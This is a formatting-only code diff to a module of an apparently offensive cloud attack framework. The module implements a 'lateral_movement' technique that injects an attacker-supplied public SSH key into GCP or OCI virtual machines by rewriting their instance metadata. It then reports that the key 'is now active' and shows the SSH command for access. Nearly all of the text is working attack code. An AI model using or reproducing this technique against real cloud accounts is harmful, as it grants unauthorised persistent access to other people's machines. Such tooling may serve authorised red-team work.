@@ -40,6 +40,7 @@ from quantum_mechanic.core.technique import Parameter, technique
 
 logger = logging.getLogger(__name__)
 
+
 # ----------------------------------------------------------------
 # Operational Formatter
 # ----------------------------------------------------------------
@@ -51,10 +52,14 @@ def format_ssh_push_result(result: Any) -> None:
     target = data.get("target", "unknown")
     user = data.get("user", "unknown")
 
-    console.print(f"  [bold green]✓[/bold green] SSH Key Injection on [cyan]{provider}[/cyan] Target [bold]{target}[/bold]")
+    console.print(
+        f"  [bold green]✓[/bold green] SSH Key Injection on [cyan]{provider}[/cyan] Target [bold]{target}[/bold]"
+    )
 
     if data.get("status") == "success":
-        console.print(f"  [bold green]Success:[/bold green] Key for user [bold cyan]{user}[/bold cyan] is now active.")
+        console.print(
+            f"  [bold green]Success:[/bold green] Key for user [bold cyan]{user}[/bold cyan] is now active."
+        )
         console.print(f"  [dim]Access via: ssh -i <private_key> {user}@<instance_ip>[/dim]")
     else:
         console.print(f"  [bold red]Error:[/bold red] {data.get('error', 'Unknown failure')}")
@@ -62,7 +67,7 @@ def format_ssh_push_result(result: Any) -> None:
 
 @technique(
     technique_id="lateral_movement/vm_ssh_push",
-    tactic='lateral_movement',
+    tactic="lateral_movement",
     mitre_id="T1569.002",
     providers=["gcp", "oci"],
     severity="critical",
@@ -71,11 +76,16 @@ def format_ssh_push_result(result: Any) -> None:
     description="Inject a public SSH key into a cloud VM via control plane metadata.",
     formatter=format_ssh_push_result,
     parameters=[
-        Parameter("target", "The target VM name (GCP) or OCID (OCI).", required=True, example="target-vm-1"),
+        Parameter(
+            "target",
+            "The target VM name (GCP) or OCID (OCI).",
+            required=True,
+            example="target-vm-1",
+        ),
         Parameter("pub", "The public SSH key string.", required=True, example="ssh-rsa AAAAB3..."),
         Parameter("user", "The username to associate with the key.", required=True, example="opc"),
         Parameter("zone", "The GCP zone (Required for GCP).", example="us-central1-a"),
-    ]
+    ],
 )
 def execute(ctx: ExecutionContext) -> dict[str, Any]:
     """Execute SSH push across providers."""
@@ -119,14 +129,22 @@ def _push_gcp(ctx: ExecutionContext) -> dict[str, Any]:
         ssh_item = next((i for i in items if i["key"] == "ssh-keys"), None)
         if ssh_item:
             if new_entry in ssh_item["value"]:
-                return {"target": target, "user": user, "status": "success", "note": "Key already present."}
+                return {
+                    "target": target,
+                    "user": user,
+                    "status": "success",
+                    "note": "Key already present.",
+                }
             ssh_item["value"] = ssh_item["value"] + "\n" + new_entry
         else:
             items.append({"key": "ssh-keys", "value": new_entry})
 
         ctx.info(f"GCP: Pushing key for {user}...")
         compute.instances().setMetadata(
-            project=project_id, zone=zone, instance=target, body={"fingerprint": fingerprint, "items": items}
+            project=project_id,
+            zone=zone,
+            instance=target,
+            body={"fingerprint": fingerprint, "items": items},
         ).execute()
 
         return {"target": target, "user": user, "status": "success"}
@@ -150,7 +168,11 @@ def _push_oci(ctx: ExecutionContext) -> dict[str, Any]:
     try:
         config = ctx.session["config"]
         signer = ctx.session.get("signer")
-        identity = oci.core.ComputeClient(config={}, signer=signer) if signer else oci.core.ComputeClient(config)
+        identity = (
+            oci.core.ComputeClient(config={}, signer=signer)
+            if signer
+            else oci.core.ComputeClient(config)
+        )
 
         ctx.info(f"OCI: Fetching metadata for {target[:20]}...")
         inst = identity.get_instance(target).data
@@ -158,7 +180,12 @@ def _push_oci(ctx: ExecutionContext) -> dict[str, Any]:
         current_keys = metadata.get("ssh_authorized_keys", "")
 
         if pub_key in current_keys:
-            return {"target": target, "user": user, "status": "success", "note": "Key already present."}
+            return {
+                "target": target,
+                "user": user,
+                "status": "success",
+                "note": "Key already present.",
+            }
 
         metadata["ssh_authorized_keys"] = (current_keys + "\n" + pub_key).strip()
 
